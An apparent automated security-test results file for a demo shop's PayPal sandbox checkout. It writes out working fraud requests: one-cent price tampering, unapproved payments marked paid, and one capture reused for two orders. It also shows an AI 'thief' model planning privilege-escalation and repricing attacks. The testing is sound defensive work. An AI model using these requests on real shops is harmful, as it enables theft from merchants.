@@ -1,0 +1,1324 @@
+[
+  {
+    "round": 0,
+    "offline": false,
+    "tests": true,
+    "prove": {
+      "ok": true,
+      "method": "paypal",
+      "verdict": "Paid $459.99: capture 4NU00958D4561344H COMPLETED, shop order 6af06ee8cc824b9400d76a94 paid, no label yet.",
+      "environment": null,
+      "bagTotal": "459.99",
+      "paypalOrderId": "4GV229463S672805L",
+      "paypalAmount": {
+        "value": "459.99",
+        "currency": "USD"
+      },
+      "paypalStatus": "COMPLETED",
+      "captureId": "4NU00958D4561344H",
+      "captureStatus": "COMPLETED",
+      "approved": true,
+      "captureBlocked": false,
+      "shopCallHeld": false,
+      "shopOrder": {
+        "id": "6af06ee8cc824b9400d76a94",
+        "status": "paid",
+        "shipments": 0,
+        "reference": "4GV229463S672805L",
+        "total": 459.99,
+        "items": [
+          {
+            "sku": "6af06edf5a27e3b99341f125",
+            "qty": 1,
+            "price": 399.99
+          }
+        ],
+        "paidAt": "2026-11-08T12:45:54.010Z",
+        "paid": true,
+        "payment_reference": "4GV229463S672805L",
+        "total_cents": 45999
+      },
+      "calls": [
+        {
+          "method": "POST",
+          "path": "/api/users/auth",
+          "body": {
+            "email": "john@email.com",
+            "password": "123456"
+          },
+          "status": 200,
+          "response": {
+            "_id": "6af06edf5a27e3b99341f11e",
+            "name": "John Doe",
+            "email": "john@email.com",
+            "isAdmin": false
+          },
+          "headers": {
+            "content-type": "application/json"
+          }
+        },
+        {
+          "method": "POST",
+          "path": "/api/orders",
+          "body": {
+            "orderItems": [
+              {
+                "_id": "6af06edf5a27e3b99341f125",
+                "user": "6af06edf5a27e3b99341f11d",
+                "name": "Sony Playstation 5",
+                "image": "/images/playstation.jpg",
+                "brand": "Sony",
+                "category": "Electronics",
+                "description": "The ultimate home entertainment center starts with PlayStation. Whether you are into gaming, HD movies, television, music",
+                "rating": 5,
+                "numReviews": 12,
+                "price": 399.99,
+                "countInStock": 11,
+                "reviews": [],
+                "__v": 0,
+                "createdAt": "2026-11-08T12:45:19.741Z",
+                "updatedAt": "2026-11-08T12:45:19.741Z",
+                "qty": 1
+              }
+            ],
+            "shippingAddress": {
+              "address": "2211 N First St",
+              "city": "San Jose",
+              "postalCode": "95131",
+              "country": "United States"
+            },
+            "paymentMethod": "PayPal",
+            "itemsPrice": "399.99",
+            "shippingPrice": "0.00",
+            "taxPrice": "60.00",
+            "totalPrice": "459.99"
+          },
+          "status": 201,
+          "response": {
+            "user": "6af06edf5a27e3b99341f11e",
+            "orderItems": [
+              {
+                "name": "Sony Playstation 5",
+                "qty": 1,
+                "image": "/images/playstation.jpg",
+                "price": 399.99,
+                "product": "6af06edf5a27e3b99341f125",
+                "_id": "6af06ee8cc824b9400d76a95"
+              }
+            ],
+            "shippingAddress": {
+              "address": "2211 N First St",
+              "city": "San Jose",
+              "postalCode": "95131",
+              "country": "United States"
+            },
+            "paymentMethod": "PayPal",
+            "itemsPrice": 399.99,
+            "taxPrice": 60,
+            "shippingPrice": 0,
+            "totalPrice": 459.99,
+            "isPaid": false,
+            "isDelivered": false,
+            "_id": "6af06ee8cc824b9400d76a94",
+            "createdAt": "2026-11-08T12:45:28.679Z",
+            "updatedAt": "2026-11-08T12:45:28.679Z",
+            "__v": 0
+          },
+          "headers": {
+            "content-type": "application/json"
+          }
+        },
+        {
+          "method": "PUT",
+          "path": "/api/orders/6af06ee8cc824b9400d76a94/pay",
+          "body": {
+            "id": "4GV229463S672805L",
+            "intent": "CAPTURE",
+            "status": "COMPLETED",
+            "purchase_units": [
+              {
+                "reference_id": "default",
+                "amount": {
+                  "currency_code": "USD",
+                  "value": "459.99"
+                },
+                "payee": {
+                  "email_address": "sandbox-merchant@business.example.com",
+                  "merchant_id": "DD3R9KG8TPPH2"
+                },
+                "shipping": {
+                  "name": {
+                    "full_name": "John Doe"
+                  },
+                  "address": {
+                    "address_line_1": "2211 N First St",
+                    "admin_area_2": "San Jose",
+                    "admin_area_1": "CA",
+                    "postal_code": "95131",
+                    "country_code": "US"
+                  }
+                },
+                "payments": {
+                  "captures": [
+                    {
+                      "id": "4NU00958D4561344H",
+                      "status": "COMPLETED",
+                      "amount": {
+                        "currency_code": "USD",
+                        "value": "459.99"
+                      },
+                      "final_capture": true,
+                      "seller_protection": {
+                        "status": "ELIGIBLE",
+                        "dispute_categories": [
+                          "ITEM_NOT_RECEIVED",
+                          "UNAUTHORIZED_TRANSACTION"
+                        ]
+                      },
+                      "create_time": "2026-11-08T12:45:52Z",
+                      "update_time": "2026-11-08T12:45:52Z"
+                    }
+                  ]
+                }
+              }
+            ],
+            "payer": {
+              "name": {
+                "given_name": "John",
+                "surname": "Doe"
+              },
+              "email_address": "sandbox-buyer@personal.example.com",
+              "payer_id": "V7ERP7YJL2X38",
+              "address": {
+                "country_code": "US"
+              }
+            },
+            "create_time": "2026-11-08T12:45:35Z",
+            "update_time": "2026-11-08T12:45:53Z",
+            "links": [
+              {
+                "href": "https://api.sandbox.paypal.com/v2/checkout/orders/4GV229463S672805L",
+                "rel": "self",
+                "method": "GET"
+              }
+            ]
+          },
+          "status": 200,
+          "response": {
+            "shippingAddress": {
+              "address": "2211 N First St",
+              "city": "San Jose",
+              "postalCode": "95131",
+              "country": "United States"
+            },
+            "paymentResult": {
+              "id": "4GV229463S672805L",
+              "status": "COMPLETED",
+              "update_time": "2026-11-08T12:45:53Z",
+              "email_address": "sandbox-buyer@personal.example.com"
+            },
+            "_id": "6af06ee8cc824b9400d76a94",
+            "user": "6af06edf5a27e3b99341f11e",
+            "orderItems": [
+              {
+                "name": "Sony Playstation 5",
+                "qty": 1,
+                "image": "/images/playstation.jpg",
+                "price": 399.99,
+                "product": "6af06edf5a27e3b99341f125",
+                "_id": "6af06ee8cc824b9400d76a95"
+              }
+            ],
+            "paymentMethod": "PayPal",
+            "itemsPrice": 399.99,
+            "taxPrice": 60,
+            "shippingPrice": 0,
+            "totalPrice": 459.99,
+            "isPaid": true,
+            "isDelivered": false,
+            "createdAt": "2026-11-08T12:45:28.679Z",
+            "updatedAt": "2026-11-08T12:45:54.011Z",
+            "__v": 0,
+            "paidAt": "2026-11-08T12:45:54.010Z"
+          },
+          "headers": {
+            "content-type": "application/json"
+          }
+        }
+      ],
+      "screenshots": [
+        "round0-purchase-1-checkout.png",
+        "round0-purchase-2-paypal.png",
+        "round0-purchase-3-review.png",
+        "round0-purchase-4-after.png"
+      ],
+      "buttons": {
+        "paypal": true,
+        "venmo": false,
+        "paylater": false
+      },
+      "payLaterMessage": null,
+      "consoleErrors": [],
+      "paypalScripts": [
+        "https://www.paypal.com/sdk/js?client-id=BAA_hcM95gky83MEdGVC5zaveBF95oKEZsdGAd0zFPlP4nWBLJQlG61E7AlN-_WuZ1M_DP8-0Lkrw7hkE4&currency=USD",
+        "https://www.paypal.com/sdk/js?client-id=BAA_hcM95gky83MEdGVC5zaveBF95oKEZsdGAd0zFPlP4nWBLJQlG61E7AlN-_WuZ1M_DP8-0Lkrw7hkE4&currency=USD"
+      ],
+      "failedRequests": [
+        "https://www.sandbox.paypal.com/xoplatform/logger/api/logger?disableSetCookie=true (net::ERR_ABORTED)",
+        "https://www.sandbox.paypal.com/xoplatform/logger/api/logger?disableSetCookie=true (net::ERR_ABORTED)"
+      ]
+    },
+    "attacks": [
+      {
+        "id": "price-tamper",
+        "title": "Price tampering",
+        "what": "Pay $0.01 for the $459.99 item",
+        "rule": [
+          1,
+          2
+        ],
+        "verdict": "robbed",
+        "summary": "Shipped the $459.99 item after PayPal captured USD 0.01 (order 24127842VR842350W); the shop's back office says paid.",
+        "evidence": {
+          "request": "/api/orders",
+          "expected": "USD 459.99",
+          "control": {
+            "paypalOrderId": null,
+            "amount": {
+              "value": "459.99",
+              "currency": "USD"
+            }
+          },
+          "tries": [
+            {
+              "variant": "total fields set to one cent",
+              "shopStatus": 201,
+              "paypalOrderId": null,
+              "shopOrder": "6af06f27cc824b9400d76aa8",
+              "paypalAmount": {
+                "value": "459.99",
+                "currency": "USD"
+              },
+              "debugId": null
+            },
+            {
+              "variant": "common price fields added to every line, at one cent",
+              "shopStatus": 201,
+              "paypalOrderId": null,
+              "shopOrder": "6af06f29cc824b9400d76aac",
+              "paypalAmount": {
+                "value": "459.99",
+                "currency": "USD"
+              },
+              "debugId": null
+            },
+            {
+              "variant": "every price in the bag set to one cent",
+              "shopStatus": 201,
+              "paypalOrderId": null,
+              "shopOrder": "6af06f2acc824b9400d76ab0",
+              "paypalAmount": {
+                "value": "459.99",
+                "currency": "USD"
+              },
+              "debugId": null
+            },
+            {
+              "variant": "every price in the bag set to 1 (cents)",
+              "shopStatus": 201,
+              "paypalOrderId": null,
+              "shopOrder": "6af06f2ccc824b9400d76ab4",
+              "paypalAmount": {
+                "value": "459.99",
+                "currency": "USD"
+              },
+              "debugId": null
+            },
+            {
+              "variant": "every number in the request set to one cent",
+              "shopStatus": 201,
+              "paypalOrderId": null,
+              "shopOrder": "6af06f2ecc824b9400d76ab8",
+              "paypalAmount": {
+                "value": "0.01",
+                "currency": "USD"
+              },
+              "debugId": null
+            },
+            {
+              "variant": "currency switched to yen",
+              "shopStatus": 201,
+              "paypalOrderId": null,
+              "shopOrder": "6af06f2fcc824b9400d76abc",
+              "paypalAmount": {
+                "value": "459.99",
+                "currency": "USD"
+              },
+              "debugId": null
+            }
+          ],
+          "variant": "every number in the request set to one cent",
+          "followThrough": {
+            "paypalOrderId": "24127842VR842350W",
+            "approved": true,
+            "captured": {
+              "currency_code": "USD",
+              "value": "0.01"
+            },
+            "shopOrder": "6af06f3acc824b9400d76acb",
+            "shopStatus": "paid",
+            "labelsAdded": 0,
+            "paidNow": [
+              "6af06f3acc824b9400d76acb"
+            ]
+          },
+          "screenshots": [
+            "round0-attack-penny-1-checkout.png",
+            "round0-attack-penny-2-paypal.png",
+            "round0-attack-penny-3-review.png",
+            "round0-attack-penny-4-after.png",
+            "round0-attack-penny-5-backoffice.png",
+            "round0-attack-price-tamper-backoffice.png"
+          ],
+          "paypalOrderId": "24127842VR842350W"
+        }
+      },
+      {
+        "id": "bad-bag",
+        "title": "Negative quantity",
+        "what": "Buy -1, 0.5 or 1,000 of an item, a product that doesn't exist, or a bag with a negative line",
+        "rule": [
+          11
+        ],
+        "verdict": "held",
+        "summary": "No bad bag got the goods for less: \"quantity -1\" was priced USD 459.99, \"quantity 0.5\" was priced USD 459.99, \"quantity 1000\" was priced USD 459.99, \"one item plus a line of -3 6af06edf5a27e3b99341f122\" was priced USD 459.99; the others were refused.",
+        "evidence": {
+          "tries": [
+            {
+              "bag": "quantity -1",
+              "shopStatus": 201,
+              "paypal": null,
+              "paypalOrderId": null,
+              "paypalAmount": {
+                "value": "459.99",
+                "currency": "USD"
+              },
+              "leastFair": "459.99",
+              "robbed": false
+            },
+            {
+              "bag": "quantity 0.5",
+              "shopStatus": 201,
+              "paypal": null,
+              "paypalOrderId": null,
+              "paypalAmount": {
+                "value": "459.99",
+                "currency": "USD"
+              },
+              "leastFair": "459.99",
+              "robbed": false
+            },
+            {
+              "bag": "quantity 1000",
+              "shopStatus": 201,
+              "paypal": null,
+              "paypalOrderId": null,
+              "paypalAmount": {
+                "value": "459.99",
+                "currency": "USD"
+              },
+              "leastFair": "459.99",
+              "robbed": false
+            },
+            {
+              "bag": "unknown product",
+              "shopStatus": 500,
+              "paypal": null,
+              "paypalOrderId": null,
+              "paypalAmount": null,
+              "leastFair": "459.99",
+              "robbed": false
+            },
+            {
+              "bag": "empty bag",
+              "shopStatus": 400,
+              "paypal": null,
+              "paypalOrderId": null,
+              "paypalAmount": null,
+              "leastFair": "0.00",
+              "robbed": false
+            },
+            {
+              "bag": "one item plus a line of -3 6af06edf5a27e3b99341f122",
+              "shopStatus": 201,
+              "paypal": null,
+              "paypalOrderId": null,
+              "paypalAmount": {
+                "value": "459.99",
+                "currency": "USD"
+              },
+              "leastFair": "459.99",
+              "robbed": false
+            }
+          ],
+          "screenshots": [
+            "round0-attack-bad-bag-backoffice.png"
+          ]
+        }
+      },
+      {
+        "id": "capture-unapproved",
+        "title": "Payment nobody approved",
+        "what": "Claim payment for an order no buyer approved",
+        "rule": [
+          4
+        ],
+        "verdict": "robbed",
+        "summary": "/api/orders/6af06f6dcc824b9400d76af2/pay, sent for order 9NU5903319804552H, which no buyer approved, made the shop mark it paid although PayPal says CREATED.",
+        "evidence": {
+          "paypalOrderId": "9NU5903319804552H",
+          "paypalStatus": "CREATED",
+          "requests": [
+            {
+              "path": "/api/orders/6af06f6dcc824b9400d76af2/pay",
+              "paypalOrderId": "9NU5903319804552H",
+              "shopOrder": "6af06f6dcc824b9400d76af2",
+              "answer": {
+                "status": 200,
+                "body": {
+                  "shippingAddress": {
+                    "address": "2211 N First St",
+                    "city": "San Jose",
+                    "postalCode": "95131",
+                    "country": "United States"
+                  },
+                  "paymentResult": {
+                    "id": "9NU5903319804552H",
+                    "status": "COMPLETED",
+                    "update_time": "2026-11-08T12:45:53Z",
+                    "email_address": "sandbox-buyer@personal.example.com"
+                  },
+                  "_id": "6af06f6dcc824b9400d76af2",
+                  "user": "6af06edf5a27e3b99341f11e",
+                  "orderItems": [
+                    {
+                      "name": "Sony Playstation 5",
+                      "qty": 1,
+                      "image": "/images/playstation.jpg",
+                      "price": 399.99,
+                      "product": "6af06edf5a27e3b99341f125",
+                      "_id": "6af06f6dcc824b9400d76af3"
+                    }
+                  ],
+                  "paymentMethod": "PayPal",
+                  "itemsPrice": 399.99,
+                  "taxPrice": 60,
+                  "shippingPrice": 0,
+                  "totalPrice": 459.99,
+                  "isPaid": true,
+                  "isDelivered": false,
+                  "createdAt": "2026-11-08T12:47:41.472Z",
+                  "updatedAt": "2026-11-08T12:47:43.532Z",
+                  "__v": 0,
+                  "paidAt": "2026-11-08T12:47:43.531Z"
+                }
+              }
+            }
+          ],
+          "orders": [
+            {
+              "id": "6af06f6dcc824b9400d76af2",
+              "before": null,
+              "after": "paid",
+              "labelsBefore": 0,
+              "labelsAfter": 0
+            }
+          ],
+          "screenshots": [
+            "round0-attack-capture-unapproved-backoffice.png"
+          ]
+        }
+      },
+      {
+        "id": "approved-not-captured",
+        "title": "Approval without payment",
+        "what": "Get it shipped before PayPal takes the money",
+        "rule": [
+          4,
+          8
+        ],
+        "verdict": "robbed",
+        "summary": "Order 86J64216HC207161B was approved but never captured, and the shop still marked it paid or shipped it.",
+        "evidence": {
+          "paypalOrderId": "86J64216HC207161B",
+          "paypalStatus": "APPROVED",
+          "approvedWebhook": "WH-3FW48340Y9007712E-2NA76175Y8642281J",
+          "approvedWebhookAnswer": 404,
+          "toldShop": {
+            "path": "/api/orders/6af06f7dcc824b9400d76b05/pay",
+            "answer": {
+              "status": 200,
+              "body": {
+                "shippingAddress": {
+                  "address": "2211 N First St",
+                  "city": "San Jose",
+                  "postalCode": "95131",
+                  "country": "United States"
+                },
+                "paymentResult": {
+                  "id": "86J64216HC207161B",
+                  "status": "COMPLETED",
+                  "update_time": "2026-11-08T12:45:53Z",
+                  "email_address": "sandbox-buyer@personal.example.com"
+                },
+                "_id": "6af06f7dcc824b9400d76b05",
+                "user": "6af06edf5a27e3b99341f11e",
+                "orderItems": [
+                  {
+                    "name": "Sony Playstation 5",
+                    "qty": 1,
+                    "image": "/images/playstation.jpg",
+                    "price": 399.99,
+                    "product": "6af06edf5a27e3b99341f125",
+                    "_id": "6af06f7dcc824b9400d76b06"
+                  }
+                ],
+                "paymentMethod": "PayPal",
+                "itemsPrice": 399.99,
+                "taxPrice": 60,
+                "shippingPrice": 0,
+                "totalPrice": 459.99,
+                "isPaid": true,
+                "isDelivered": false,
+                "createdAt": "2026-11-08T12:47:57.811Z",
+                "updatedAt": "2026-11-08T12:48:31.198Z",
+                "__v": 0,
+                "paidAt": "2026-11-08T12:48:31.196Z"
+              }
+            }
+          },
+          "orders": [
+            {
+              "id": "6af06f7dcc824b9400d76b05",
+              "before": null,
+              "after": "paid",
+              "labelsBefore": 0,
+              "labelsAfter": 0
+            }
+          ],
+          "screenshots": [
+            "round0-attack-approved-only-1-checkout.png",
+            "round0-attack-approved-only-2-paypal.png",
+            "round0-attack-approved-only-3-review.png",
+            "round0-attack-approved-only-4-after.png",
+            "round0-attack-approved-not-captured-backoffice.png"
+          ]
+        }
+      },
+      {
+        "id": "declined-capture",
+        "title": "Declined card",
+        "what": "Get it shipped after the card is declined",
+        "rule": [
+          5
+        ],
+        "verdict": "n/a",
+        "summary": "Does not apply to this shop: the shop never captures on its server; a capture PayPal declines in the browser never reaches it, and an approved payment that was never captured is the approval-without-payment robbery.",
+        "evidence": {}
+      },
+      {
+        "id": "double-capture",
+        "title": "Double click",
+        "what": "Capture twice at once to get two shipments",
+        "rule": [
+          8,
+          10
+        ],
+        "verdict": "robbed",
+        "summary": "One PayPal payment (order 5Y0962572C566470J) paid for 2 orders sent at the same moment: 6af06fcccc824b9400d76b28, 6af06fcccc824b9400d76b2c.",
+        "evidence": {
+          "paypalOrderId": "5Y0962572C566470J",
+          "requests": [
+            {
+              "path": "/api/orders/6af06fcccc824b9400d76b28/pay",
+              "answer": {
+                "status": 200,
+                "body": {
+                  "shippingAddress": {
+                    "address": "2211 N First St",
+                    "city": "San Jose",
+                    "postalCode": "95131",
+                    "country": "United States"
+                  },
+                  "paymentResult": {
+                    "id": "5Y0962572C566470J",
+                    "status": "COMPLETED",
+                    "update_time": "2026-11-08T12:45:53Z",
+                    "email_address": "sandbox-buyer@personal.example.com"
+                  },
+                  "_id": "6af06fcccc824b9400d76b28",
+                  "user": "6af06edf5a27e3b99341f11e",
+                  "orderItems": [
+                    {
+                      "name": "Sony Playstation 5",
+                      "qty": 1,
+                      "image": "/images/playstation.jpg",
+                      "price": 399.99,
+                      "product": "6af06edf5a27e3b99341f125",
+                      "_id": "6af06fcccc824b9400d76b29"
+                    }
+                  ],
+                  "paymentMethod": "PayPal",
+                  "itemsPrice": 399.99,
+                  "taxPrice": 60,
+                  "shippingPrice": 0,
+                  "totalPrice": 459.99,
+                  "isPaid": true,
+                  "isDelivered": false,
+                  "createdAt": "2026-11-08T12:49:16.256Z",
+                  "updatedAt": "2026-11-08T12:49:16.267Z",
+                  "__v": 0,
+                  "paidAt": "2026-11-08T12:49:16.267Z"
+                }
+              }
+            },
+            {
+              "path": "/api/orders/6af06fcccc824b9400d76b2c/pay",
+              "answer": {
+                "status": 200,
+                "body": {
+                  "shippingAddress": {
+                    "address": "2211 N First St",
+                    "city": "San Jose",
+                    "postalCode": "95131",
+                    "country": "United States"
+                  },
+                  "paymentResult": {
+                    "id": "5Y0962572C566470J",
+                    "status": "COMPLETED",
+                    "update_time": "2026-11-08T12:45:53Z",
+                    "email_address": "sandbox-buyer@personal.example.com"
+                  },
+                  "_id": "6af06fcccc824b9400d76b2c",
+                  "user": "6af06edf5a27e3b99341f11e",
+                  "orderItems": [
+                    {
+                      "name": "Sony Playstation 5",
+                      "qty": 1,
+                      "image": "/images/playstation.jpg",
+                      "price": 399.99,
+                      "product": "6af06edf5a27e3b99341f125",
+                      "_id": "6af06fcccc824b9400d76b2d"
+                    }
+                  ],
+                  "paymentMethod": "PayPal",
+                  "itemsPrice": 399.99,
+                  "taxPrice": 60,
+                  "shippingPrice": 0,
+                  "totalPrice": 459.99,
+                  "isPaid": true,
+                  "isDelivered": false,
+                  "createdAt": "2026-11-08T12:49:16.262Z",
+                  "updatedAt": "2026-11-08T12:49:16.268Z",
+                  "__v": 0,
+                  "paidAt": "2026-11-08T12:49:16.268Z"
+                }
+              }
+            }
+          ],
+          "orders": [
+            {
+              "id": "6af06fcccc824b9400d76b28",
+              "before": null,
+              "after": "paid",
+              "labelsBefore": 0,
+              "labelsAfter": 0
+            },
+            {
+              "id": "6af06fcccc824b9400d76b2c",
+              "before": null,
+              "after": "paid",
+              "labelsBefore": 0,
+              "labelsAfter": 0
+            }
+          ],
+          "screenshots": [
+            "round0-attack-double-capture-backoffice.png"
+          ]
+        }
+      },
+      {
+        "id": "forged-webhook",
+        "title": "Forged webhook",
+        "what": "Fake PayPal's 'payment completed' message",
+        "rule": [
+          6
+        ],
+        "verdict": "n/a",
+        "summary": "Does not apply to this shop: the shop has no webhook route, so there is no PayPal event to forge, replay or send late.",
+        "evidence": {}
+      },
+      {
+        "id": "webhook-replay",
+        "title": "Webhook replay",
+        "what": "Resend PayPal's real message to ship again",
+        "rule": [
+          7,
+          8
+        ],
+        "verdict": "n/a",
+        "summary": "Does not apply to this shop: the shop has no webhook route, so there is no PayPal event to forge, replay or send late.",
+        "evidence": {}
+      },
+      {
+        "id": "out-of-order",
+        "title": "Late event",
+        "what": "Send 'approved' after 'completed' to roll an order back",
+        "rule": [
+          9
+        ],
+        "verdict": "n/a",
+        "summary": "Does not apply to this shop: the shop has no webhook route, so there is no PayPal event to forge, replay or send late.",
+        "evidence": {}
+      },
+      {
+        "id": "secret-leak",
+        "title": "Secret in the browser",
+        "what": "Look for the PayPal secret or an access token in every page and script",
+        "rule": [
+          12
+        ],
+        "verdict": "held",
+        "summary": "Checked 9 pages, scripts and endpoints, and every answer during the purchase: no secret and no access token, only the client id is public.",
+        "evidence": {
+          "checked": [
+            "/static/js/main.53995cb1.js",
+            "/",
+            "/admin",
+            "/api/products",
+            "/api/paypal/config",
+            "/api/users",
+            "/api/orders",
+            "/api/upload",
+            "/api/config/paypal"
+          ],
+          "leakedAt": []
+        }
+      }
+    ],
+    "webhook": "no-route",
+    "webhookEvent": "WH-1Y92486113404022L-4E517168WV296005C",
+    "paypalErrors": [],
+    "books": {
+      "matched": true,
+      "orders": 26,
+      "paid": 10,
+      "otherPaid": 0,
+      "mismatches": [
+        {
+          "order": "6af06f3acc824b9400d76acb",
+          "problem": "shipped the same goods as the real purchase (6af06edf5a27e3b99341f125 x 1) for $0.01 instead of $459.99"
+        },
+        {
+          "order": "6af06f6dcc824b9400d76af2",
+          "problem": "paid with 0 parcel(s), but PayPal holds no completed capture for it"
+        },
+        {
+          "order": "6af06f7dcc824b9400d76b05",
+          "problem": "paid with 0 parcel(s), but PayPal holds no completed capture for it"
+        },
+        {
+          "order": "6af06fcccc824b9400d76b2c",
+          "problem": "paid by capture 0CC65817YK780023J, which already pays for order 6af06fcccc824b9400d76b28"
+        },
+        {
+          "order": "6af070a3cc824b9400d76b55",
+          "problem": "paid by capture 1NY60089YS417712D, which already pays for order 6af07084cc824b9400d76b45"
+        }
+      ]
+    },
+    "thief": {
+      "ran": true,
+      "model": "muse-wonder-1.0",
+      "provider": "Meta Model API",
+      "source": "model",
+      "dropped": [],
+      "plans": [
+        {
+          "name": "Double-spend one capture on two shop orders",
+          "idea": "The pay endpoint may validate a capture only by amount/status, not by whether that PayPal transaction was already used for a different shop order.",
+          "expect": "The purchase from the buy step and a second separately created shop order are both marked paid, yielding two parcels for one $459.99 capture.",
+          "verdict": "repeat",
+          "summary": "Only repeated a problem the books already showed (one payment paying for two orders) on order 6af070a3cc824b9400d76b55: not a new way in.",
+          "steps": [
+            {
+              "step": {
+                "do": "buy",
+                "tamper": {},
+                "blockCapture": false,
+                "save": "b"
+              },
+              "result": "PayPal order 2YS65254FP292743H, approved, capture COMPLETED, shop order 6af07084cc824b9400d76b45 paid"
+            },
+            {
+              "step": {
+                "do": "request",
+                "method": "POST",
+                "path": "/api/orders",
+                "body": {
+                  "orderItems": [
+                    {
+                      "_id": "6af06edf5a27e3b99341f125",
+                      "user": "6af06edf5a27e3b99341f11d",
+                      "name": "Sony Playstation 5",
+                      "image": "/images/playstation.jpg",
+                      "brand": "Sony",
+                      "category": "Electronics",
+                      "description": "The ultimate home entertainment center starts with PlayStation. Whether you are into gaming, HD movies, television, music",
+                      "rating": 5,
+                      "numReviews": 12,
+                      "price": 399.99,
+                      "countInStock": 11,
+                      "reviews": [],
+                      "__v": 0,
+                      "createdAt": "2026-11-08T12:45:19.741Z",
+                      "updatedAt": "2026-11-08T12:45:19.741Z",
+                      "qty": 1
+                    }
+                  ],
+                  "shippingAddress": {
+                    "address": "2211 N First St",
+                    "city": "San Jose",
+                    "postalCode": "95131",
+                    "country": "United States"
+                  },
+                  "paymentMethod": "PayPal",
+                  "itemsPrice": "399.99",
+                  "shippingPrice": "0.00",
+                  "taxPrice": "60.00",
+                  "totalPrice": "459.99"
+                },
+                "headers": {},
+                "times": 1,
+                "together": false,
+                "save": "a"
+              },
+              "result": "HTTP 201 {\"user\":\"6af06edf5a27e3b99341f11e\",\"orderItems\":[{\"name\":\"Sony Playstation 5\",\"qty\":1,\"image\":\"/images/playstation.jpg\",\"price\":399.99,\"product\":\"6af06edf5a27e3..."
+            },
+            {
+              "step": {
+                "do": "request",
+                "method": "PUT",
+                "path": "/api/orders/{{a.body._id}}/pay",
+                "body": {
+                  "id": "{{b.paypalOrderId}}",
+                  "intent": "CAPTURE",
+                  "status": "COMPLETED",
+                  "update_time": "2026-11-08T12:45:53Z",
+                  "payer": {
+                    "email_address": "sandbox-buyer@personal.example.com",
+                    "name": {
+                      "given_name": "John",
+                      "surname": "Doe"
+                    }
+                  },
+                  "purchase_units": [
+                    {
+                      "reference_id": "default",
+                      "amount": {
+                        "currency_code": "USD",
+                        "value": "{{legit.bagTotal}}"
+                      },
+                      "payments": {
+                        "captures": [
+                          {
+                            "id": "{{b.captureId}}",
+                            "status": "COMPLETED",
+                            "amount": {
+                              "currency_code": "USD",
+                              "value": "{{legit.bagTotal}}"
+                            },
+                            "final_capture": true
+                          }
+                        ]
+                      }
+                    }
+                  ]
+                },
+                "headers": {},
+                "times": 1,
+                "together": false,
+                "save": "c"
+              },
+              "result": "HTTP 200 {\"shippingAddress\":{\"address\":\"2211 N First St\",\"city\":\"San Jose\",\"postalCode\":\"95131\",\"country\":\"United States\"},\"paymentResult\":{\"id\":\"2YS65254FP292743H\",\"sta..."
+            }
+          ],
+          "mismatches": [
+            {
+              "order": "6af070a3cc824b9400d76b55",
+              "problem": "paid by capture 1NY60089YS417712D, which already pays for order 6af07084cc824b9400d76b45"
+            }
+          ]
+        },
+        {
+          "name": "Inject paid state at order creation",
+          "idea": "Order creation may accept client-supplied payment-state fields instead of always initializing isPaid to false on the server.",
+          "expect": "A newly created order is immediately returned and stored as paid, without any new PayPal capture.",
+          "verdict": "held",
+          "summary": "The books still match PayPal's records: nothing taken.",
+          "steps": [
+            {
+              "step": {
+                "do": "request",
+                "method": "POST",
+                "path": "/api/orders",
+                "body": {
+                  "orderItems": [
+                    {
+                      "_id": "6af06edf5a27e3b99341f125",
+                      "user": "6af06edf5a27e3b99341f11d",
+                      "name": "Sony Playstation 5",
+                      "image": "/images/playstation.jpg",
+                      "brand": "Sony",
+                      "category": "Electronics",
+                      "description": "The ultimate home entertainment center starts with PlayStation. Whether you are into gaming, HD movies, television, music",
+                      "rating": 5,
+                      "numReviews": 12,
+                      "price": 399.99,
+                      "countInStock": 11,
+                      "reviews": [],
+                      "__v": 0,
+                      "createdAt": "2026-11-08T12:45:19.741Z",
+                      "updatedAt": "2026-11-08T12:45:19.741Z",
+                      "qty": 1
+                    }
+                  ],
+                  "shippingAddress": {
+                    "address": "2211 N First St",
+                    "city": "San Jose",
+                    "postalCode": "95131",
+                    "country": "United States"
+                  },
+                  "paymentMethod": "PayPal",
+                  "itemsPrice": "399.99",
+                  "shippingPrice": "0.00",
+                  "taxPrice": "60.00",
+                  "totalPrice": "459.99",
+                  "isPaid": true,
+                  "paidAt": "2026-11-08T12:45:54.010Z",
+                  "isDelivered": false,
+                  "paymentResult": {
+                    "id": "{{legit.paypalOrderId}}",
+                    "status": "COMPLETED",
+                    "update_time": "2026-11-08T12:45:53Z",
+                    "email_address": "sandbox-buyer@personal.example.com"
+                  }
+                },
+                "headers": {},
+                "times": 1,
+                "together": false,
+                "save": "a"
+              },
+              "result": "HTTP 201 {\"user\":\"6af06edf5a27e3b99341f11e\",\"orderItems\":[{\"name\":\"Sony Playstation 5\",\"qty\":1,\"image\":\"/images/playstation.jpg\",\"price\":399.99,\"product\":\"6af06edf5a27e3..."
+            },
+            {
+              "step": {
+                "do": "request",
+                "method": "GET",
+                "path": "/api/orders/{{a.body._id}}",
+                "body": {},
+                "headers": {},
+                "times": 1,
+                "together": false,
+                "save": "c"
+              },
+              "result": "HTTP 200 {\"shippingAddress\":{\"address\":\"2211 N First St\",\"city\":\"San Jose\",\"postalCode\":\"95131\",\"country\":\"United States\"},\"_id\":\"6af070abcc824b9400d76b5d\",\"user\":{\"_id\"..."
+            }
+          ],
+          "mismatches": []
+        },
+        {
+          "name": "Become admin and reprice the product",
+          "idea": "The profile-update endpoint may mass-assign isAdmin; an admin product update would then change the database price that both the shop total and PayPal amount are calculated from.",
+          "expect": "A normal subsequent purchase is charged only $0.01 for the PlayStation plus whatever shipping and tax the shop calculates on that price.",
+          "verdict": "held",
+          "summary": "The books still match PayPal's records: nothing taken.",
+          "steps": [
+            {
+              "step": {
+                "do": "request",
+                "method": "PUT",
+                "path": "/api/users/profile",
+                "body": {
+                  "name": "John Doe",
+                  "email": "john@email.com",
+                  "isAdmin": true
+                },
+                "headers": {},
+                "times": 1,
+                "together": false,
+                "save": "a"
+              },
+              "result": "HTTP 200 {\"_id\":\"6af06edf5a27e3b99341f11e\",\"name\":\"John Doe\",\"email\":\"john@email.com\",\"isAdmin\":false}"
+            },
+            {
+              "step": {
+                "do": "request",
+                "method": "PUT",
+                "path": "/api/products/6af06edf5a27e3b99341f125",
+                "body": {
+                  "name": "Sony Playstation 5",
+                  "image": "/images/playstation.jpg",
+                  "brand": "Sony",
+                  "category": "Electronics",
+                  "description": "The ultimate home entertainment center starts with PlayStation. Whether you are into gaming, HD movies, television, music",
+                  "price": 0.01,
+                  "countInStock": 11
+                },
+                "headers": {},
+                "times": 1,
+                "together": false,
+                "save": "c"
+              },
